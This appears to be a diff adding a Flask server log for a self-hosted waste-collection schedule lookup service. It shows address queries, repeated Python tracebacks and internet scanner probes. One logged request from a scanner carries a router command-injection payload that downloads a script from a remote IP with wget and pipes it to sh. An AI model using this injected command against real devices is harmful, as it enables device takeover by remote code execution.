+185.218.84.178 - - [27/Jun/2025 02:10:21] "GET / HTTP/1.1" 404 -
+204.76.203.212 - - [27/Jun/2025 02:19:50] "GET / HTTP/1.1" 404 -
+13.89.124.218 - - [27/Jun/2025 02:24:56] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 02:25:52] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.0" 404 -
+167.94.145.99 - - [27/Jun/2025 02:31:22] "GET / HTTP/1.1" 404 -
+167.94.145.99 - - [27/Jun/2025 02:31:26] "GET / HTTP/1.1" 404 -
+167.94.145.99 - - [27/Jun/2025 02:31:27] code 505, message Invalid HTTP version (2.0)
+167.94.145.99 - - [27/Jun/2025 02:31:27] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.145.99 - - [27/Jun/2025 02:31:30] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.145.99 - - [27/Jun/2025 02:31:31] code 505, message Invalid HTTP version (2.0)
+167.94.145.99 - - [27/Jun/2025 02:31:31] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.145.99 - - [27/Jun/2025 02:31:34] code 400, message Bad request version ('À\x14À')
+167.94.145.99 - - [27/Jun/2025 02:31:34] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¼ÿ\x8c!n¾RÝí\x8d\x02#\x9e~ç.Ï-"\x15gèÕª!\x1198\x8aßãÕ µ¥{\x94\x03\x87ýþh\x03GXÊE@J·Ìz3\x13¦\x94vØß\x08s¯Ù&(\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.145.99 - - [27/Jun/2025 02:31:35] "GET /sitemap.xml HTTP/1.1" 404 -
+185.218.84.178 - - [27/Jun/2025 03:09:47] "GET / HTTP/1.1" 404 -
+45.131.155.254 - - [27/Jun/2025 03:11:45] code 400, message Bad request version ('À\x13À')
+45.131.155.254 - - [27/Jun/2025 03:11:45] "\x16\x03\x01\x00â\x01\x00\x00Þ\x03\x03UÌBÇüëp.\x8cÊ±\x81\x89\x92÷KOb\x04bk<b~\x02í1$t\x149Ð ± éä`g¶Ñ\x8cBg\x981@û\x17}ã\x9e[¿ S|ÑWvT\x15££\x15\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+45.131.155.254 - - [27/Jun/2025 03:12:03] code 400, message Bad request version ('À\x13À')
+45.131.155.254 - - [27/Jun/2025 03:12:03] "\x16\x03\x01\x00ô\x01\x00\x00ð\x03\x03øÛe4\x9fÈ¹Ë\x1a>µu\x12A<rGÄ\x9e\x09HF\x8fÝ,^á¡\x86\x07Ð\x88 \x99\x81\x8cL\x09\x81a0¶jß­anÈ\x1dTO-Á\x8dD\x02k\x8erºïµ\x94lÌ\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+45.131.155.254 - - [27/Jun/2025 03:12:18] code 400, message Bad request syntax ('CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x002\x02\x00\x00¼±§±host::\x00')
+45.131.155.254 - - [27/Jun/2025 03:12:18] "CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x002\x02\x00\x00¼±§±host::\x00" HTTPStatus.BAD_REQUEST -
+45.131.155.254 - - [27/Jun/2025 03:12:27] code 400, message Bad request version ('Ê©\x03\x00\x07default\x00')
+45.131.155.254 - - [27/Jun/2025 03:12:27] "\x00\x11Clickhouse client\x18\x0cÊ©\x03\x00\x07default\x00" HTTPStatus.BAD_REQUEST -
+45.131.155.254 - - [27/Jun/2025 03:12:32] code 400, message Bad HTTP/0.9 request type ('\x00')
+45.131.155.254 - - [27/Jun/2025 03:12:32] "\x00\x1e««\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03" HTTPStatus.BAD_REQUEST -
+141.255.162.250 - - [27/Jun/2025 03:18:38] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 03:35:43] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:35:43] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+204.76.203.212 - - [27/Jun/2025 03:39:25] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 03:42:50] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:42:50] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+[2025-06-27 03:43:31,653] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 03:43:31] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 03:43:31,660] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 03:43:31] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 03:43:38,772] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 03:43:38] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 03:43:38,776] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 03:43:38] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 03:43:44] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:43:44] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:46:30] "GET /collections?address=116%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 03:46:31] "GET /collections?address=116%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 03:46:43] "GET /collections?address=116%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 03:46:44] "GET /collections?address=116%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 03:47:08] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+207.167.67.206 - - [27/Jun/2025 03:50:13] "GET http://example.com/ HTTP/1.1" 404 -
+207.167.67.206 - - [27/Jun/2025 03:50:13] "CONNECT example.com:443 HTTP/1.1" 404 -
+207.167.67.206 - - [27/Jun/2025 03:50:14] "GET http://example.com/ HTTP/1.1" 404 -
+207.167.67.206 - - [27/Jun/2025 03:50:14] "CONNECT example.com:443 HTTP/1.1" 404 -
+[2025-06-27 03:50:34,690] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 03:50:34] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 03:50:35,264] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 03:50:35] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 03:51:11,859] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 03:51:11] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 03:51:12,474] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 03:51:12] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 03:51:41] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:51:41] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:51:49] "GET /collections?address=116%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 03:51:58] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:51:59] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:52:10] "GET /collections?address=16%203%20Henry%20street,%20Windsor HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 03:52:21] "GET /collections?address=16%203%20Henry%20street,%20Windsor HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 03:52:21] "GET /collections?address=16%203%20Henry%20street,%20Windsor HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 03:53:13] "GET /collections?address=16%203%20Henry%20street,%20Windsor HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 03:53:14] "GET /collections?address=16%203%20Henry%20street,%20Windsor HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 03:53:20] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+[2025-06-27 03:56:23,906] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 61, in get_collections
+    Source = load_source(module)
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 37, in load_source
+    spec.loader.exec_module(mod)
+  File "<frozen importlib._bootstrap_external>", line 883, in exec_module
+  File "<frozen importlib._bootstrap>", line 241, in _call_with_frames_removed
+  File "/home/sihanren409/hacs_waste_collection_schedule/custom_components/waste_collection_schedule/waste_collection_schedule/source/impactapps_com_au.py", line 6, in <module>
+    from waste_collection_schedule.exceptions import (
+ModuleNotFoundError: No module named 'waste_collection_schedule.exceptions'; 'waste_collection_schedule' is not a package
+127.0.0.1 - - [27/Jun/2025 03:56:23] "GET /collections?address=16%20Henry%20street HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 03:56:28] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:56:35] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:56:36] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+45.156.129.57 - - [27/Jun/2025 03:57:57] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 03:58:05] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:58:05] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:58:32] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:58:33] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:58:52] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:58:53] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:59:13] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:59:13] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 03:59:21] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 03:59:26] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 03:59:28] "POST / HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 03:59:31] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 03:59:31] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:00:28] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:00:28] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:01:39] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:01:39] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:02:25] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:02:25] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:02:59] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:02:59] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:03:42] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:03:42] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:05:18] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:05:19] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:05:39] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:05:40] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:07:00] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:07:00] "GET /collections?address=166%20Henry%20street,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:07:26] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:07:34] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:07:34] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+87.121.84.34 - - [27/Jun/2025 04:08:38] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://220.158.232.99/x/tplink+-O-|sh) HTTP/1.1" 404 -
+87.121.84.34 - - [27/Jun/2025 04:08:38] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://220.158.232.99/x/tplink+-O-|sh) HTTP/1.1" 404 -
+[2025-06-27 04:13:03,618] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 04:13:03] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 04:13:04,048] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 04:13:04] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:13:22] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:13:22] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:13:39] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:13:45] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:13:45] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:15:45] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:15:48] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:15:48] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+64.62.197.2 - - [27/Jun/2025 04:16:55] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 04:16:58] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:16:58] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:17:11] "GET /collections?address=16%20Henry%20Street,%20Windsor HTTP/1.0" 200 -
+64.62.197.5 - - [27/Jun/2025 04:17:21] "GET /favicon.ico HTTP/1.1" 404 -
+64.62.197.14 - - [27/Jun/2025 04:17:31] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+64.62.197.13 - - [27/Jun/2025 04:17:36] "CONNECT www.shadowserver.org:443 HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 04:17:37] "GET /collections?address=16%20Henry%20Street,%20Windsor HTTP/1.0" 200 -
+64.62.197.2 - - [27/Jun/2025 04:17:40] "GET /geoserver/web/ HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 04:17:41] "GET /collections?address=16%20Henry%20Street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:17:41] "GET /collections?address=16%20Henry%20Street,%20Windsor HTTP/1.0" 200 -
+185.218.84.178 - - [27/Jun/2025 04:19:09] "GET / HTTP/1.1" 404 -
+[2025-06-27 04:21:39,815] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 04:21:39] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 04:21:39,844] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 04:21:39] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:21:44] "GET /collections?address=16%20Henry%20Street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:21:45] "GET /collections?address=16%20Henry%20Street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:22:12] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:22:16] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:22:21] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:22:25] "GET /collections?address=16%20Henry%20St,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:22:39] "GET /collections?address=16%20Henry%20street,windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:22:44] "GET /collections?address=16%20Henry%20street,%20windsor HTTP/1.0" 200 -
